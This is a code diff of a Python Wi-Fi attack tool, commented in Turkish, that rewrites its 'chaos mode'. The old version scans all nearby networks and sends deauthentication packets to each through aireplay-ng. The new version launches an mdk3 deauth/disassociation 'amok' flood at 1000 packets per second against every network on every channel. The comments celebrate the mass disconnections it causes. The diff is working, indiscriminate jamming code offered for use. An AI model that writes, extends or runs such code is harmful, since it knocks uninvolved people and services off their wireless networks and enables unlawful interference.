@@ -89,37 +89,21 @@ def beacon_spam(iface):
         print("\n    [✘] Hata: 'mdk3' aracı eksik olabilir. (Terminalde: sudo apt install mdk3 yazarak kur)")
 
 # ==========================================
-# YENİ: CHAOS MODU (OTOMATİK KİTLE İMHA)
+# YENİ: CHAOS MODU (MDK3 AMOK - KANSER ETME)
 # ==========================================
 def chaos_mode(iface):
-    print("\n    \033[91m\033[1m[!] CHAOS MODU AKTİF EDİLDİ [!]\033[0m")
-    print("    \033[91m[*] Program etraftaki tüm ağları sırayla gezip deauth atacak.\033[0m")
-    print("    \033[91m[*] Durdurana kadar döngü devam eder. (Durdurmak için CTRL+C)\033[0m")
+    print("\n    \033[91m\033[1m[!] KANSER MODU (MDK3 AMOK) AKTİF EDİLDİ [!]\033[0m")
+    print("    \033[91m[*] MDK3 kanallar arasında ışık hızında zıplıyor...\033[0m")
+    print("    \033[91m[*] Çevredeki tüm ağlarda devasa pingler ve kopmalar yaratılıyor.\033[0m")
+    print("    \033[91m[*] (Durdurmak için CTRL+C)\033[0m")
     time.sleep(2)
     
+    # mdk3 d : Deauth/Disassociation Amok Mode (Her şeye saldırır)
+    # -s 1000 : Saniyede 1000 paketlik devasa bir mermi hızı
+    cmd = f"sudo mdk3 {iface} d -s 1000"
+    
     try:
-        while True:
-            # 5 saniyelik hızlı tarama atıyoruz
-            networks = radar.auto_scan_and_select(iface, scan_time=5)
-            
-            if not networks:
-                print("    [!] Etrafta ağ bulunamadı. 5 saniye sonra tekrar taranacak...")
-                time.sleep(5)
-                continue
-            
-            print(f"\n    [*] {len(networks)} hedef kilitlendi! Yok etme protokolü başlatılıyor...")
-            time.sleep(1)
-            
-            for net in networks:
-                print(f"\n    [>] Hedef Vuruluyor: {net['essid']} (Kanal: {net['ch']})")
-                
-                # Cihazın kanalını hedefin kanalına eşitliyoruz
-                engine.run_cmd(f"sudo iwconfig {iface} channel {net['ch']}")
-                
-                # Hedefe 50 adet seri deauth paketi fırlatıyoruz
-                # Terminal kirlenmesin diye çıktıları gizliyoruz
-                cmd = f"sudo aireplay-ng -0 50 -a {net['bssid']} {iface}"
-                subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                
+        # MDK3 tüm kanal gezme ve vurma işini kendisi halleder
+        subprocess.run(cmd, shell=True)
     except KeyboardInterrupt:
-        print("\n    \033[92m[✔] Chaos Modu durduruldu. Ortalık sakinleşti.\033[0m")
+        print("\n    \033[92m[✔] Kanser Modu durduruldu. Ortalık sakinleşti.\033[0m")
